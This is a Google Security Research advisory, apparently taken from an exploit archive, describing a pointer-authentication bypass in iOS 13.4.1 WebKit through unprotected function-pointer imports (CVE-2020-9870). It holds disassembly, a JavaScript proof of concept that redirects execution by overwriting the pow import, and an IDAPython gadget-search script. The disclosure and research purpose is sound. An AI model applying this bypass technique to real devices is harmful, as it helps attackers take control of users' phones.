@@ -1,0 +1,113 @@
+id: 34848
+date: 08/19/2020
+title: PAC Bypass Due To Unprotected Function Pointer Imports Exploit
+author: Google Security Research
+cves: CVE-2020-9870
+
+PAC bypass due to unprotected function pointer imports
+
+PAC [1] aims to prevent an attacker with the ability to read and write memory from executing arbitrary code. It does that by cryptographically signing and validating code pointers (as well as some data pointers) at runtime. However, it seems that imports of function pointers from shared libraries in userspace are not properly protected by PAC, allowing an attacker to sign arbitrary pointers and thus bypass PAC. The preconditions and impact of this issue should be the same as for issue #2042, thus I'm reporting it via our tracker.
+
+Consider the following code from WebKit:
+
+    LValue Output::doublePow(LValue xOperand, LValue yOperand)
+    {
+        double (*powDouble)(double, double) = pow;
+        return callWithoutSideEffects(B3::Double, powDouble, xOperand, yOperand);
+    }
+
+This function from the FTL JIT compiler is responsible for lowering a Math.pow invocation (when called with doubles as arguments) by inserting a call to the pow c library function (see `man 3 pow`). In iOS 13.4.1 on arm64e, this function looks as follows when disassembled:
+
+    ; __int64 __fastcall JSC::FTL::Output::doublePow(JSC::FTL::Output *__hidden this, JSC::B3::Value *, JSC::B3::Value *)
+    __ZN3JSC3FTL6Output9doublePowEPNS_2B35ValueES4_
+                    MOV             X4, X2
+                    MOV             X3, X1
+                    ADRP            X16, #_pow_ptr_3@PAGE
+                    LDR             X16, [X16,#_pow_ptr_3@PAGEOFF]
+                    PACIZA          X16
+                    MOV             X2, X16
+                    MOV             W1, #4
+                    B               __ZN3JSC3FTL6Output22callWithoutSideEffectsIPFdddEJPNS_2B35ValueEEEES7_NS5_4TypeET_S7_DpT0_ ; JSC::FTL::Output::callWithoutSideEffects<double (*)(double,double),JSC::B3::Value *>(JSC::B3::Type,double (*)(double,double),JSC::B3::Value *,JSC::B3::Value *)
+    ; End of function JSC::FTL::Output::doublePow(JSC::B3::Value *,JSC::B3::Value *)
+
+This code essentially loads a pointer from a static address, then signs it with the PACIZA instruction [2] and passes it on to the callWithoutSideEffects function, which then embeds a call to it into the emitted JIT code. Note that no PAC validation of the loaded function pointer is performed, and in fact, the retrieved pointer is not PAC-signed at all. As the region from which the pointer is loaded is writable, an attacker is able to change the function pointer stored there, causing WebKit to later sign and execute an arbitrary address. The following JavaScript code snippet demonstrates this, assuming the attacker has already achieved arbitrary memory read/write:
+
+    // offset from iOS 13.4.1, iPhone Xs
+    let powImportAddr = Add(jscBase, 0x34e1d570);
+    memory.writePtr(powImportAddr, new Int64('0x41414141'));
+
+    function trigger(x) {
+        return Math.pow(x, 13.37);
+    }
+    for (let i = 0; i < 10000000; i++) {
+        trigger(i + 0.1);
+    }
+
+This will cause the renderer process to crash with PC at 0x41414141, demonstrating that PAC has been bypassed.
+
+The vulnerable code pattern seems to be widespread, for example, here is a similar piece of code from libxpc:
+
+    libxpc:__text:00000001AA9A5F00                 ADRP            X16, #_free_ptr_1@PAGE
+    libxpc:__text:00000001AA9A5F04                 LDR             X16, [X16,#_free_ptr_1@PAGEOFF]
+    libxpc:__text:00000001AA9A5F08                 PACIZA          X16
+
+It seems that this problem generally occurs whenever a function from a shared library is referenced as pointer as opposed to being called directly.
+
+I used an IDAPython script to search the dyld shared cache for PAC signing gadgets such as this one. It is still very rudimentary at this point, but I'm attaching it below. The script will search for PAC signing instructions, then output their location as well as the potential \"gadget\" (which includes the four preceding instructions) into a file. Afterwards, that file can be searched for interesting code patterns. There are a few very frequent but safe patterns such as `ADRL            X16, sub_1AA9A6F94; PACIZA          X16` (which signs a constant pointer). They can, for the most part, easily be removed from the output file though (e.g. with \":g/ADRL/d\" in vim). Ideally, in the future the script itself would be able to identify these patterns and skip them.
+
+    import idautils
+    import idaapi
+    import ida_nalt
+    import idc
+
+    from os.path import expanduser
+    home = expanduser(\"~\")
+
+    mnemonics = ['PACIA', 'PACIZA', 'PACIA1716', 'PACIAZ']
+
+    gadgets = []
+
+    for seg_ea in idautils.Segments():
+        seg_name = idc.get_segm_name(seg_ea)
+        seg_start = idc.get_segm_start(seg_ea)
+        seg_end = idc.get_segm_end(seg_ea)
+
+        for func_ea in idautils.Functions(seg_start, seg_end):
+            for (start_ea, end_ea) in idautils.Chunks(func_ea):
+                for head in idautils.Heads(start_ea, end_ea):
+                    insn = idautils.DecodeInstruction(head)
+                    if not insn:
+                        continue
+
+                    if insn.itype == idaapi.ARM_pac:
+                        disas = idc.GetDisasm(head)
+                        if not any(mn in disas for mn in mnemonics):
+                            continue
+
+                        parts = []
+                        for ea in range(head - 20, head + 4, 4):
+                            parts.append(idc.GetDisasm(ea))
+                        gadgets.append('{}:0x{:x}    '.format(seg_name, head) + '; '.join(parts))
+
+
+    with open(home + \"/Desktop/gadgets.txt\", \"w\") as f:
+        f.write('\
+'.join(gadgets))
+        f.write('\
+')
+
+    print(\"Done, found {} gadgets\".format(len(gadgets)))
+
+
+[1] https://support.apple.com/guide/security/pointer-authentication-codes-seca5759bf02/web
+[2] https://developer.arm.com/docs/100076/0100/instruction-set-reference/a64-general-instructions/pacia-paciza-pacia1716-paciasp-paciaz
+
+This bug is subject to a 90 day disclosure deadline. After 90 days elapse,
+the bug report will become visible to the public. The scheduled disclosure
+date is 2020-08-18. Disclosure at an earlier date is possible if
+agreed upon by all parties.
+
+
+Related CVE Numbers: CVE-2020-9870.
+
+#  0day.today [2023-03-24]  #
